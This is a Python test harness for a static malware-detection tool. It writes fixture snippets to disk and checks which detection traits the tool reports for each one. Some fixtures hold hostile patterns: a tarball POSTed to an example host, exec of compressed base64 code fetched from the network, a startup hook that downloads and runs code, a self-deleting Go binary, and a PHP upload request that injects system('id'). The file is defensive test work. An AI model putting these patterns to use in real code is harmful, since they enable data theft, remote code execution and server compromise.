#!/usr/bin/env python3
"""Static rule controls. Never imports or executes the inspected sources."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
JSON = "micro-behaviors/communications/http/request/json::"
BODY = "micro-behaviors/communications/http/request/body::"
UPLOAD = "micro-behaviors/communications/http/upload::python-tar-buffer-http-helper"
OWN = "micro-behaviors/fs/delete/file/self::go-remove-own-executable-path"
PHP = "objectives/execution/exploit/file-upload::"
COMPRESSED = "micro-behaviors/data/compression::http-response-compression-execution-cooccurrence"


def documents(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        doc, end = decoder.raw_decode(text)
        yield doc
        text = text[end:]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="cleave")
    parser.add_argument("--traits-dir", type=Path, default=ROOT)
    parser.add_argument("--work-dir", type=Path, required=True)
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    cases = []
    with tempfile.TemporaryDirectory(prefix="source-controls-", dir=args.work_dir) as work:
        work = Path(work)

        def add(name, source, required=(), forbidden=()):
            path = work / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(source)
            cases.append((path, set(required), set(forbidden)))

        imports = "import json, urllib.request\n"
        for name, tail, required in (
            ("keyword", 'urllib.request.Request(url, data=json.dumps(report).encode())', "urllib-request-json-keyword-body"),
            ("positional", 'urllib.request.Request(url, json.dumps(report).encode())', "urllib-request-json-positional-body"),
            ("urlopen-keyword", 'urllib.request.urlopen(url, data=json.dumps(report).encode())', "urllib-urlopen-json-keyword-body"),
            ("urlopen-positional", 'urllib.request.urlopen(url, json.dumps(report).encode())', "urllib-urlopen-json-positional-body"),
        ):
            add(name + ".py", imports + tail + "\n", [JSON + required])
        add("assigned.py", imports + 'body = json.dumps(report).encode()\n'
            'req = urllib.request.Request(url, data=body)\nurllib.request.urlopen(req)\n',
            [JSON + "urllib-request-json-keyword-body"])
        add("reassigned.py", imports + 'body = json.dumps(report).encode()\nbody = b"ordinary"\n'
            'req = urllib.request.Request(url, data=body)\n',
            [BODY + "urllib-body-near-json-serialization"], [JSON + "urllib-json-request-body"])
        add("separate-json.py", imports + 'local = json.dumps(report)\n'
            'req = urllib.request.Request(url, data=b"binary archive")\n',
            [BODY + "urllib-body-near-json-serialization"], [JSON + "urllib-json-request-body"])
        add("header-only.py", imports + 'local = json.dumps(report)\n'
            'req = urllib.request.Request(url)\n', [],
            [BODY + "urllib-body-near-json-serialization", JSON + "urllib-json-request-body"])
        add("put.py", imports + 'req = urllib.request.Request(url, data=json.dumps(report).encode(), method="PUT")\n',
            [JSON + "urllib-request-json-keyword-body"])

        source = '''import io, tarfile, urllib.request
def package_data():
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as archive:
        archive.add("document.txt")
    transmit("https://backup.example.net/upload", stream.getvalue())
def transmit(address, payload):
    req = urllib.request.Request(address, data=payload, method="POST")
    urllib.request.urlopen(req)
'''
        add("archive.py", source, [UPLOAD])
        add("archive-renamed.py", source.replace("stream", "collected").replace("transmit", "post_archive")
            .replace("address", "destination").replace("payload", "body"), [UPLOAD])
        add("different-buffer.py", source.replace('stream.getvalue()', 'other.getvalue()'), [], [UPLOAD])
        add("different-helper.py", source.replace('def transmit(', 'def other('), [], [UPLOAD])
        add("different-body.py", source.replace('data=payload', 'data=b"status"'), [], [UPLOAD])
        add("different-endpoint.py", source.replace('Request(address,', 'Request(other,'), [], [UPLOAD])
        add("no-archive.py", source.replace('tarfile.open(fileobj=stream, mode="w:gz")', 'open("plain.txt")'), [], [UPLOAD])
        add("overwritten-buffer.py", source.replace('    transmit(', '    stream = io.BytesIO()\n    transmit('), [], [UPLOAD])
        add("overwritten-parameter.py", source.replace('    req =', '    payload = b"status"\n    req ='), [], [UPLOAD])

        for name, expression in (
            ("separate-packed.py", '"eJwrKMrMK9Ew1OQCAAf7AcQ="'),
            ("received-packed.py", 'received'),
        ):
            add(name, 'import requests, base64, zlib\n'
                'received = requests.get("https://assets.example.net/plugin").text\n'
                'exec(zlib.decompress(base64.b64decode(' + expression + ')))\n',
                [COMPRESSED],
                ["objectives/command-and-control/channel/deaddrop/public-service::public-service-packed-stage"])

        add("separate/sitecustomize.py", 'import requests\n'
            'configuration = requests.get("https://settings.example.net/config").text\n'
            'exec(compile("local_value = 1", "<local>", "exec"))\n',
            ["objectives/persistence/system/python-startup::startup-hook-http-compiled-exec-cooccurrence"],
            ["objectives/persistence/system/python-startup::startup-hook-http-source-exec"])

        own = 'package main\nimport "os"\nfunc main() { self, _ := os.Executable(); os.Remove(self) }\n'
        add("own.go", own, [OWN])
        add("other.go", own.replace('os.Remove(self)', 'os.Remove("/tmp/output")'), [], [OWN])

        request = ('POST /index.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=b\n\n'
                   '--b\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\n\nx\n'
                   '--b\nContent-Disposition: form-data; name="f"; filename="<?php system(\'id\');?>"\n\nZ\n--b--\n')
        def embedded_request(wire):
            return 'request = r"""' + wire + '"""\n'

        add("filename.py", embedded_request(request), [PHP + "php-session-progress-command-payload", PHP + "php-session-progress-code-injection"])
        field = request.replace('PROGRESS"\n\nx', 'PROGRESS"\n\n<?php system(\'id\');?>')
        field = field.replace('filename="<?php system(\'id\');?>"', 'filename="plain.txt"')
        add("progress-value.py", embedded_request(field), [PHP + "php-session-progress-command-payload", PHP + "php-code-in-session-progress-field"])
        normal = request.replace('filename="<?php system(\'id\');?>"\n\nZ', 'filename="example.php"\n\n<?php system(\'id\');?>')
        add("ordinary-php-upload.py", embedded_request(normal), [], [PHP + "php-session-progress-command-payload", PHP + "php-session-progress-code-injection"])

        # Independent, pre-existing fixtures exercise retained attack coverage.
        existing = [
            "testdata/hostile/compressed-source-evaluation.py",
            "testdata/hostile/py-b64-exec-dropper.py",
            "testdata/hostile/python-staged-payloads/image-response-aliases.py",
            "testdata/hostile/python-webhook-site-env-exfil.py",
            "testdata/hostile/urllib-put-traversal-drop.py",
            "testdata/triage/first-review/loader-no-cover.py",
            "testdata/benign/python-packed-data-control.py",
            "testdata/benign/virtualenv-relocatable-template-controls.py",
        ]
        cases.extend((ROOT / p, set(), set()) for p in existing)
        run = subprocess.run([args.cleave, "--traits-dir", str(args.traits_dir), "--format", "json",
                              "analyze", *(str(p) for p, _, _ in cases)], capture_output=True, text=True)
        if run.returncode:
            raise RuntimeError(run.stderr)
        reports = list(documents(run.stdout))
        if args.output:
            args.output.write_text(json.dumps(reports, indent=2))
        files = [f for report in reports for f in report["files"]]
        for path, required, forbidden in cases:
            ids = {t["id"] for f in files if f["path"] == str(path) for t in f.get("traits", [])}
            assert required <= ids, (path.name, "missing", required - ids)
            assert not forbidden & ids, (path.name, "unexpected", forbidden & ids)
            print("PASS", path.name)
        print(len(cases), "static controls passed")


if __name__ == "__main__":
    main()
